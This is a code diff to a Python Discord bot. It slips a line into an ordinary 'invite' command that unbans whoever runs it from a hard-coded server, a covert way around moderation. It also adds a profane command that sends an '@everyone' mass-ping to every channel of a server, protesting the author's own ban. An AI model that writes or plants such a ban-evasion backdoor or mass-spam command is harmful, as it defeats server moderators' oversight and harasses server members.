@@ -82,9 +82,16 @@ async def invite(ctx):
     print(guild.name)    
     channel = guild.get_channel(549763840330563606)
     print(channel.name)
+    await guild.unban(ctx.message.author)
     invite = await channel.create_invite()
     await ctx.send(invite)
-		       
+
+@client.command()
+async def fuckyou(ctx):
+    guild = client.get_guild(441385793492221962)
+    for channel in guild.channels:
+        await channel.send("@everyone if you are going to ban me from the discord ban my bot too `NOTE: NOT AN ADMIN ABUSE; JUST KICK THE FUCKING BOT`")    
+        
 @client.command()
 async def guildpic(ctx, sizable):
     if sizable.lower() == 'tiny':
